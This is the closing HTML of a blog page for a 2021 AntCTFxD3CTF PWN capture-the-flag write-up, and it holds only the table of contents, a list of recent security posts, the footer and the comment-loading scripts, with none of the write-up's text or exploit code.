href="#%E5%88%86%E6%9E%90"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Truth"><span class="toc-text">Truth</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-1"><span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8B%A1%E5%85%94%E4%B8%89%E7%AA%9F"><span class="toc-text">狡兔三窟</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-2"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-2"><span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-2"><span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hackphp"><span class="toc-text">hackphp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-3"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7"><span class="toc-text">调试技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-3"><span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#liproll"><span class="toc-text">liproll</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-4"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-3"><span class="toc-text">利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-text">调试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-4"><span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/95726211.html" title="AFL源码及流程分析"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-3.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="AFL源码及流程分析"/></a><div class="content"><a class="title" href="/posts/95726211.html" title="AFL源码及流程分析">AFL源码及流程分析</a><time datetime="2022-05-26T07:20:45.000Z" title="发表于 2022-05-26 15:20:45">2022-05-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/1029211104.html" title="V8 重新入门-2019 starCTF oob 题解"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-37.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="V8 重新入门-2019 starCTF oob 题解"/></a><div class="content"><a class="title" href="/posts/1029211104.html" title="V8 重新入门-2019 starCTF oob 题解">V8 重新入门-2019 starCTF oob 题解</a><time datetime="2021-11-05T14:20:21.000Z" title="发表于 2021-11-05 22:20:21">2021-11-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/1864456601.html" title="2021 0CTF/TCTF Final Naive Heap"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-57.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2021 0CTF/TCTF Final Naive Heap"/></a><div class="content"><a class="title" href="/posts/1864456601.html" title="2021 0CTF/TCTF Final Naive Heap">2021 0CTF/TCTF Final Naive Heap</a><time datetime="2021-09-29T02:18:50.000Z" title="发表于 2021-09-29 10:18:50">2021-09-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/2427305175.html" title="虚拟机逃逸&amp;漏洞复现"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-17.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="虚拟机逃逸&amp;漏洞复现"/></a><div class="content"><a class="title" href="/posts/2427305175.html" title="虚拟机逃逸&amp;漏洞复现">虚拟机逃逸&amp;漏洞复现</a><time datetime="2021-08-18T05:34:33.000Z" title="发表于 2021-08-18 13:34:33">2021-08-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/3705072996.html" title="2021 XCTF Final 线下WP"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-32.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2021 XCTF Final 线下WP"/></a><div class="content"><a class="title" href="/posts/3705072996.html" title="2021 XCTF Final 线下WP">2021 XCTF Final 线下WP</a><time datetime="2021-07-30T07:26:18.000Z" title="发表于 2021-07-30 15:26:18">2021-07-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By LYYL</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'https://www.lyyl.online/posts/3469048985.html'
    this.page.identifier = 'posts/3469048985.html'
    this.page.title = '2021 AntCTFxD3CTF PWN WriteUp'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://lyyl-online.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }
}

if ('Disqus' === 'Disqus' || !false) {
  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>